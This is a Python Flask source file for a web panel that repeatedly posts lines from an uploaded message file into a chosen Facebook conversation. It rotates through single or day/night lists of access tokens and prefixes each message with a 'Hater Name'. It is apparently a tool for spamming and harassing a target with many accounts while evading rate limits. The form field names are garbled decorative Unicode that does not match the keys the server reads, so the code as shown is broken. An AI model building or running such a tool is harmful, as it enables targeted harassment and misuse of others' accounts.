from flask import Flask, request, render_template_string
import threading, time, requests, pytz
from datetime import datetime
import uuid

app = Flask(__name__)
# A dictionary to store logs for each task
task_logs = {}
# A dictionary to store event objects for stopping tasks
stop_events = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>,)🥀❤️‍🩹𝐋𝐎𝐕𝐄 𝐘𝐎𝐔 𝐌𝐘 𝐂𝐔𝐓𝐈𝐄 🩵🧚</title>
    <style>
        /* General Styling */
        body {
            margin: 0;
            padding: 0;
            background-color: #0d1a2b; /* Fadu Dark Pink Background */
            color: #00ff00; /* Neon Red Text */
            font-family: 'Courier New', Courier, monospace;
            line-height: 1.6;
            transition: background-color 0.5s ease;
        }

        h1 {
            color: #ff00ff; /* Bright Pink for the Title */
            font-size: 3rem;
            text-align: center;
            margin: 20px 0;
            text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff1493;
            animation: glow 1.5s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff1493; }
            to { text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff1493; }
        }

        /* Form Container */
        .content {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px;
            background-color: #1a0d2b; /* Dark Purple UI Box */
            border-radius: 15px;
            box-shadow: 0 0 30px #00ff00;
            margin-top: 30px;
        }

        /* Form Inputs and Labels */
        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #00ff00; /* Neon Green Labels */
            font-weight: 600;
            text-shadow: 0 0 10px #00ff00;
            font-size: 1.1rem;
        }

        .form-control, .form-file {
            width: 100%;
            padding: 14px;
            background-color: #1a0d2b; /* Dark Purple Input BG */
            border: 1px solid #ff00ff; /* Pink Border */
            border-radius: 8px;
            color: #ff00ff; /* Pink Text */
            font-size: 1rem;
            transition: border-color 0.3s ease-in-out;
            box-sizing: border-box;
        }

        .form-control:focus {
            border-color: #00ff00; /* Neon yellow Focus */
            outline: none;
            box-shadow: 0 0 8px #00ff00;
        }
        
        /* Logs Container */
        #logs-container {
            margin-top: 30px;
            background-color: #0d1a2b; /* Dark Pink Logs BG */
            padding: 20px;
            border-radius: 10px;
            border: 1px dashed #ff00ff; /* Dashed Balck Border */
            max-height: 400px;
            overflow-y: scroll;
            white-space: pre-wrap;
            font-size: 0.9rem;
            color: #00ff00;
        }
        
        /* Buttons */
        .btn {
            padding: 14px 30px;
            font-size: 1.1rem;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: 0.3s ease-in-out;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
            margin-top: 10px;
        }

        .btn-primary {
            background-color: #ff00ff; /* Pink Primary Button */
            color: #121212;
        }

        .btn-primary:hover {
            background-color: #ff1493;
            box-shadow: 0 0 10px #ff1493;
        }

        .btn-danger {
            background-color: #ff00ff; /* Pink Danger Button */
            color: #121212;
        }

        .btn-danger:hover {
            background-color: #ff1493;
            box-shadow: 0 0 10px #ff1493;
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 30px;
            color: #bbb;
            margin-top: 40px;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
            .btn {
                width: 100%;
                padding: 12px 20px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <h1>❤️❤️‍🩹🥀𝐌𝐘 𝐂𝐔𝐓𝐈𝐄 𝐒𝐄𝐑𝐕𝐄𝐑🕊️ 😃❤️</h1>
    <div class="content">
        <form id="startForm" method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label class="form-label">Token Option:</label>
                <select name="ȚǑƘΞƝ💔ǑƤƮĭǑƝ" class="form-control" onchange="toggleInputs(this.value)">
                    <option value="single">Ĉ𝖴Ț|Ĕ 😍ϒΩՍR ȚǑƘĔƝ</option>
                    <option value="multi">ᘻÛLȚ| 😘ȚǑƘĔƝs</option>
                </select>
            </div>

            <div id="singleInput" class="form-group">
                <label class="form-label">Single Token:</label>
                <input type="text" name="ŠîƝԌLΞ😍ȚǑƘĔƝ" class="form-control">
            </div>

            <div id="multiInputs" class="form-group" style="display: none;">
                <label class="form-label">Day File:</label>
                <input type="file" name="dayFile" class="form-file">
                <label class="form-label">Night File:</label>
                <input type="file" name="nightFile" class="form-file">
            </div>

            <div class="form-group">
                <label class="form-label">Conversation☠️ID:</label>
                <input type="text" name="ĈǑƝѴǑ🥰" class="form-control" required>
            </div>

            <div class="form-group">
                <label class="form-label">Message File:</label>
                <input type="Ĉ𝖴Țî.ᖴÎɭΞ🤭" name="msgFile" class="form-file" required>
            </div>

            <div class="form-group">
                <label class="form-label">Interval (sec):</label>
                <input type="ƝǑᘻBΞR💀" name="interval" class="form-control" required>
            </div>

            <div class="form-group">
                <label class="form-label">Hater Name:</label>
                <input type="text" name="😃𝘍𝘐𝘓𝘌❤️" class="form-control" required>
            </div>
            
            <button class="btn btn-primary" type="submit">💝💔RÛƝ🤭</button>
        </form>

        <form id="stopForm" method="POST" action="/stop" style="margin-top: 20px;">
            <div class="form-group">
                <label class="form-label">Task ID to Stop:</label>
                <input type="text" name="task_id" class="form-control" required>
            </div>
            <button class="btn btn-danger" type="submit">💀 𝗦𝗧𝗢𝗣 𝗖𝗨𝗧𝗜𝗘☠️</button>
        </form>
        
        <div id="logs-section">
            <h2 style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">Logs</h2>
            <div id="logs-container">
                </div>
        </div>

    </div>

    <footer>© Created By Prince brand</footer>

    <script>
        function toggleInputs(value) {
            document.getElementById("singleInput").style.display = value === "single" ? "block" : "none";
            document.getElementById("multiInputs").style.display = value === "multi" ? "block" : "none";
        }
        
        // Polling function to get logs from the server
        function getLogs() {
            fetch('/get_logs')
            .then(response => response.json())
            .then(data => {
                const logsContainer = document.getElementById('logs-container');
                logsContainer.innerHTML = ''; // Clear previous logs
                for (const taskId in data) {
                    const taskLogDiv = document.createElement('div');
                    taskLogDiv.innerHTML = `<h3>Task ID: ${taskId}</h3><pre>${data[taskId]}</pre>`;
                    logsContainer.appendChild(taskLogDiv);
                }
            })
            .catch(error => console.error('Error fetching logs:', error));
        }

        // Fetch logs every 3 seconds
        setInterval(getLogs, 3000);

        // Initial fetch
        getLogs();
    </script>
</body>
</html>
"""

def add_log(task_id, message):
    if task_id not in task_logs:
        task_logs[task_id] = ""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    task_logs[task_id] += f"[{timestamp}] {message}\n"

@app.route("/get_logs")
def get_logs():
    return task_logs

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/", methods=["POST"])
def handle_form():
    opt = request.form["tokenOption"]
    convo = request.form["convo"]
    interval = int(request.form["interval"])
    hater = request.form["haterName"]
    msgs = request.files["msgFile"].read().decode().splitlines()
    
    task_id = str(uuid.uuid4())
    add_log(task_id, "Starting a new task...")

    if opt == "single":
        tokens = [request.form["singleToken"]]
        add_log(task_id, "Single token option selected.")
    else:
        tokens = {
            "day": request.files["dayFile"].read().decode().splitlines(),
            "night": request.files["nightFile"].read().decode().splitlines()
        }
        add_log(task_id, "Multi-token option selected.")
    
    stop_events[task_id] = threading.Event()
    thread = threading.Thread(target=start_messaging, args=(tokens, msgs, convo, interval, hater, opt, task_id))
    thread.daemon = True # Allows the thread to exit with the main app
    thread.start()
    
    return f"Messaging started for conversation {convo}. Task ID: {task_id}"

@app.route("/stop", methods=["POST"])
def stop_task():
    task_id = request.form["task_id"]
    if task_id in stop_events:
        stop_events[task_id].set()
        add_log(task_id, "Stop command received. Stopping task...")
        # Clean up after stopping
        del stop_events[task_id]
        return f"Task with ID {task_id} has been stopped."
    else:
        return f"No active task with ID {task_id}."

def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    
    add_log(task_id, "Task started successfully.")
    
    while not stop_event.is_set():
        current_hour = datetime.now(pytz.timezone('UTC')).hour

        if token_option == "multi":
            if 6 <= current_hour < 18:
                token_list = tokens["day"]
                current_time_period = "day"
            else:
                token_list = tokens["night"]
                current_time_period = "night"
            add_log(task_id, f"Current time period: {current_time_period}. Using {len(token_list)} tokens.")
        else:
            token_list = tokens
        
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "Task stopped.")
                return
            
            current_token = token_list[token_index]
            response_code = send_msg(convo_id, current_token, msg, hater_name)
            
            if response_code == 200:
                add_log(task_id, f"Message sent successfully with token {token_index + 1}.")
            else:
                add_log(task_id, f"Failed to send message with token {token_index + 1}. Status code: {response_code}")
                
            token_index = (token_index + 1) % len(token_list)
            time.sleep(interval)
            
    add_log(task_id, "Task stopped successfully.")

def send_msg(convo_id, access_token, message, hater_name):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name}: {message}"
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        return response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Error sending message: {e}")
        return None

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
